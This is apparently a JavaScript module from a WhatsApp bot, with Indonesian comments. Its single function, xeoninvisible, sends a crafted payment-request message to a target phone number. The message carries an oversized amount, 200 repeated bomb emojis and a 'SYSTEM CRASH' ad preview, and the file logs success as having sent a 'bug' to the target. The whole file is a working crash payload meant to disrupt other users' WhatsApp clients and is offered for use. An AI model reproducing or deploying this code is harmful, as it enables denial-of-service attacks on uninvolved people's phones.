// lib/crash.js - FIXED RELAY ERROR
async function xeoninvisible(sock, target) {
  try {
    // Pastikan format JID benar
    target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    // Generate ID manual agar tidak error 'toString'
    const msgId = sock.generateMessageTag();

    const PayCrash = {
      requestPaymentMessage: {
        currencyCodeIso4217: 'USD',
        amount1000: 999999999,
        requestFrom: target,
        noteMessage: {
          extendedTextMessage: {
            text: '💣'.repeat(200),
            contextInfo: {
              mentionedJid: [target],
              externalAdReply: {
                showAdAttribution: true,
                title: "🪦 SYSTEM CRASH 🪦",
                thumbnailUrl: "https://files.catbox.moe/2z1knq.jpg",
                sourceUrl: "wa.me/settings",
                mediaType: 1
              }
            }
          }
        }
      }
    };

    // FIX: Jangan masukkan participant object yang bikin error
    // Cukup messageId saja
    await sock.relayMessage(target, PayCrash, { 
        messageId: msgId 
    });

    console.log(`[💀] SUKSES KIRIM BUG KE: ${target}`);
    return true;
    
  } catch (error) {
    console.error(`[❌] Gagal Crash: ${error.message}`);
    return false; 
  }
}

module.exports = { xeoninvisible };
